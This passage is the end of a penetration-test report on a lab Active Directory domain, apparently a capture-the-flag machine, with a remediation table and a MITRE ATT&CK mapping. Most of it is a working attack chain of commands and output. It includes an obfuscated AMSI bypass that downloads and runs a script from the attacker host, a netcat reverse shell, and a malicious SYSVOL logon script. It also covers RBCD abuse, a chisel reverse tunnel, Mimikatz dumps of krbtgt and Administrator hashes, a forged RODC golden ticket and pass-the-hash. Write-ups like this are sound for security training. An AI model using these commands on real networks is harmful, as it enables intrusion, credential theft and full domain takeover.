powershell -nop -w hidden -c "sET-ItEM ('V'+'aR'+'ia'+'blE:HW'+'i') ([TYpE]('S'+'ys'+'te'+'m.M'+'an'+'ag'+'em'+'en'+'t.A'+'ut'+'om'+'at'+'io'+'n.A'+'ms'+'i'+'U'+'ti'+'ls'));(GeT-VaRiaBlE ('H'+'Wi')).ValUE.GeTFiEld(('a'+'ms'+'i'+'S'+'ie'+'Init'+'Fa'+'il'+'ed'),'NonPublic,Static').SeTValUE($null,$true); iex (iwr 'http://10.10.16.145/run.ps1' -useb)"
EOF
```

**Step 2.7: Start HTTP server and netcat listener**

```bash
python3 -m http.server 80
nc -lvnp 4444
```

**Step 2.8: Upload updated payload and re-set scriptPath**

```bash
smbclient //10.129.25.205/SYSVOL -U 'j.arbuckle%Th1sD4mnC4t!@1978' -c "cd garfield.htb\\scripts; put printerDetect.bat"
python3 bloodyAD.py -d garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' --host 10.129.25.205 set object l.wilson scriptPath -v "printerDetect.bat"
```

**Step 2.9: Receive reverse shell**

HTTP server confirms `run.ps1` was requested. Netcat listener receives the connection:

```
connect to [10.10.16.145] from (UNKNOWN) [10.129.25.205] 64841
PS C:\Windows\system32> whoami
garfield\l.wilson
```

---

### Phase 3: Privilege Escalation: l.wilson to l.wilson_adm

**Step 3.1: Reset l.wilson_adm password via ADSI from l.wilson shell**

```powershell
$dn = "CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb"
$admin = [ADSI]"LDAP://$dn"
$admin.psbase.invoke("SetPassword", @("GarfieldAdminPwned2026"))
```

**Step 3.2: Verify password change was accepted**

```powershell
[DateTime]::FromFileTime((Get-ADUser l.wilson_adm -Properties PwdLastSet).PwdLastSet)
```

**Step 3.3: Authenticate as l.wilson_adm via WinRM**

```bash
evil-winrm -i 10.129.25.205 -u 'l.wilson_adm' -p 'GarfieldAdminPwned2026'
```

---

### Phase 4: Lateral Movement to RODC01 via RBCD

**Step 4.1: Create machine account in domain**

```bash
impacket-addcomputer 'garfield.htb/l.wilson_adm:GarfieldAdminPwned2026' -computer-name 'FOO-PC$' -computer-pass 'ComputerPass123!' -dc-ip 10.129.25.205
```

**Step 4.2: Configure RBCD: allow FOO-PC$ to delegate to RODC01$**

```bash
impacket-rbcd 'garfield.htb/l.wilson_adm:GarfieldAdminPwned2026' -action write -delegate-to 'RODC01$' -delegate-from 'FOO-PC$' -dc-ip 10.129.25.205
```

**Step 4.3: Synchronise time and request service ticket impersonating Administrator**

```bash
net time -S 10.129.25.205
faketime 'Thu Apr  9 12:49:35 2026' impacket-getST garfield.htb/'FOO-PC$':'ComputerPass123!' -spn 'cifs/RODC01.garfield.htb' -impersonate Administrator -dc-ip 10.129.25.205
```

**Step 4.4: Export ticket to environment**

```bash
export KRB5CCNAME=Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

**Step 4.5: Establish chisel SOCKS tunnel via DC01 to reach RODC01 internal subnet**

Start chisel server on attacker host:

```bash
chisel server -p 8000 --reverse
```

From the `l.wilson_adm` WinRM session on DC01, upload and start chisel client:

```powershell
upload chisel.exe
.\chisel.exe client 10.10.16.145:8000 R:socks
```

Configure `/etc/proxychains4.conf`:

```
socks5  127.0.0.1 1080
```

Add RODC01 to `/etc/hosts`:

```bash
echo "192.168.100.2  RODC01.garfield.htb" | sudo tee -a /etc/hosts
```

**Step 4.6: Access RODC01 via WinRM through the tunnel**

```bash
proxychains evil-winrm -i RODC01.garfield.htb -u 'l.wilson_adm' -p 'GarfieldAdminPwned2026'
```

**Step 4.7: Confirm RODC01 access and enumerate users**

```
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> whoami
garfield\l.wilson_adm

dir C:\Users
```

Output:

```
08/17/2025  07:35 AM  a.wilson
08/16/2025  04:47 PM  Administrator
04/01/2026  12:31 PM  Administrator.GARFIELD
08/16/2025  04:47 PM  Public
09/12/2025  09:23 AM  svc_ldap
```

---

### Phase 5: RODC Exploitation: krbtgt_8245 Extraction

**Step 5.1: Upload Mimikatz and Rubeus to RODC01**

From the WinRM session:

```powershell
upload mimikatz.exe
upload Rubeus.exe
```

**Step 5.2: Extract krbtgt_8245 from RODC01 LSA**

```
.\mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:krbtgt_8245" "exit"
```

Key output:

```
RID  : 00000643 (1603)
User : krbtgt_8245

NTLM : 445aa4221e751da37a10241d962780e2
aes256_hmac (4096) : d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240
aes128_hmac (4096) : 124c0fd09f5fa4efca8d9f1da91369e5
```

---

### Phase 6: RODC PRP Manipulation and Administrator Hash Extraction

**Step 6.1: Add Administrator to msDS-RevealOnDemandGroup (RODC allow-list)**

Executed from the attacker host (proxychains not required for this: targets DC01):

```bash
bloodyAD -u l.wilson_adm -p 'GarfieldAdminPwned2026' -d garfield.htb --host 10.129.25.205 set object "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" msDS-RevealOnDemandGroup -v "CN=Administrator,CN=Users,DC=garfield,DC=htb"
```

**Step 6.2: Adjust msDS-NeverRevealGroup to remove blocking**

```bash
bloodyAD -u l.wilson_adm -p 'GarfieldAdminPwned2026' -d garfield.htb --host 10.129.25.205 set object "CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb" msDS-NeverRevealGroup -v "CN=Account Operators,CN=Builtin,DC=garfield,DC=htb" -v "CN=Server Operators,CN=Builtin,DC=garfield,DC=htb" -v "CN=Backup Operators,CN=Builtin,DC=garfield,DC=htb"
```

**Step 6.3: Forge RODC Golden Ticket for Administrator with Rubeus**

From the RODC01 WinRM session:

```
.\Rubeus.exe golden /rodcNumber:8245 /aes256:d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240 /user:Administrator /id:500 /domain:garfield.htb /sid:S-1-5-21-2502726253-3859040611-225969357 /nowrap
```

**Step 6.4: Inject the forged ticket into the current session**

```
.\Rubeus.exe ptt /ticket:<base64 output from previous step>
```

**Step 6.5: Force-replicate Administrator credential from DC01 to RODC01**

With the forged ticket loaded:

```
repadmin /rodcpwdrepl RODC01 DC01 "CN=Administrator,CN=Users,DC=garfield,DC=htb"
```

**Step 6.6: Extract Administrator NTLM hash from RODC01 LSA**

```
.\mimikatz.exe "privilege::debug" "lsadump::lsa /inject /name:Administrator" "exit"
```

Key output:

```
RID  : 000001f4 (500)
User : Administrator

NTLM : ee238f6debc752010428f20875b092d5
aes256_hmac (4096) : 53b9e15b84f5b44ca093b5a74098b26aae113a806a9a7ff647754dc6518e9c29
```

---

### Phase 7: Domain Compromise

**Step 7.1: Authenticate to DC01 as domain Administrator via pass-the-hash**

```bash
impacket-psexec garfield.htb/Administrator@10.129.25.205 -hashes aad3b435b51404eeaad3b435b51404ee:ee238f6debc752010428f20875b092d5
```

**Step 7.2: Confirm SYSTEM access and retrieve root flag**

```
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
DC01

C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
```

Domain compromise complete.

---

## 7. Remediation Summary

| Priority | Finding | Immediate Action |
|---|---|---|
| Immediate | Finding 6 | Reset Administrator password. Add to Denied RODC PRP Group. Reset krbtgt_8245. |
| Immediate | Finding 5 | Reset krbtgt_8245. Enable LSASS PPL. Harden RODC admin access. |
| Immediate | Finding 2 | Remove SYSVOL scripts write access from non-admin accounts. Enable write auditing. |
| High | Finding 1 | Audit and remove scriptPath write delegations from non-admin accounts via BloodHound. |
| High | Finding 4 | Remove RBCD write rights on RODC01$. Set MachineAccountQuota to 0. |
| High | Finding 3 | Audit ForceChangePassword and GenericAll delegations. Remove from non-admin accounts. |

---

## 8. Appendix A: Tools Used

| Tool | Version | Purpose |
|---|---|---|
| Nmap | 7.95 | Host and service discovery |
| NetExec (nxc) | latest | SMB/LDAP authentication and enumeration |
| CrackMapExec | latest | SMB share and user enumeration |
| smbclient | system | SYSVOL file operations |
| ldapsearch | system | Full LDAP dump |
| BloodHound / bloodhound-python | latest | AD attack path analysis |
| bloodyAD | latest | AD attribute write (scriptPath, PRP attributes) |
| impacket-addcomputer | 0.14.0 | Machine account creation |
| impacket-rbcd | 0.14.0 | RBCD delegation configuration |
| impacket-getST | 0.14.0 | Kerberos S4U service ticket request |
| impacket-psexec | 0.14.0 | Remote SYSTEM shell via SMB |
| evil-winrm | latest | WinRM interactive shell |
| chisel | latest | SOCKS5 reverse tunnel |
| Mimikatz | 2.2.0 | LSA credential extraction |
| Rubeus | 2.3.3 | RODC golden ticket forging and injection |
| faketime | system | Kerberos clock skew compensation |
| ntpdate | system | Domain time synchronisation |
| tcpdump | system | ICMP callback verification |
| python3 http.server | system | Payload staging web server |
| netcat | system | Reverse shell listener |

---

## 9. Appendix B: MITRE ATT&CK Mapping

| Technique ID | Name | Phase | Finding |
|---|---|---|---|
| T1046 | Network Service Discovery | Reconnaissance | Phase 1 |
| T1018 | Remote System Discovery | Reconnaissance | Phase 1 |
| T1087.002 | Account Discovery: Domain Account | Reconnaissance | Phase 1 |
| T1069.002 | Permission Groups Discovery: Domain Groups | Reconnaissance | Phase 1 |
| T1078.002 | Valid Accounts: Domain Accounts | Initial Access | Phase 1 |
| T1484.001 | Domain Policy Modification | Execution | Finding 1 |
| T1037.001 | Logon Script (Windows) | Execution / Persistence | Finding 2 |
| T1059.001 | Command and Scripting Interpreter: PowerShell | Execution | Phase 2 |
| T1098 | Account Manipulation | Privilege Escalation | Finding 3 |
| T1134.001 | Token Impersonation via RBCD | Lateral Movement | Finding 4 |
| T1090 | Proxy | Command and Control | Phase 4 |
| T1570 | Lateral Tool Transfer | Defence Evasion | Phase 4-5 |
| T1562.001 | Impair Defences: AMSI Bypass | Defence Evasion | Phase 2 |
| T1003.001 | OS Credential Dumping: LSASS Memory | Credential Access | Finding 5 |
| T1558.001 | Steal or Forge Kerberos Tickets: Golden Ticket | Credential Access | Finding 5 |
| T1003.006 | OS Credential Dumping: DCSync / LSA Secrets | Credential Access | Finding 6 |
| T1021.006 | Remote Services: Windows Remote Management | Lateral Movement | Phase 3, 4 |

---

*End of Report: Garfield Domain | garfield.htb | Full Domain Compromise*
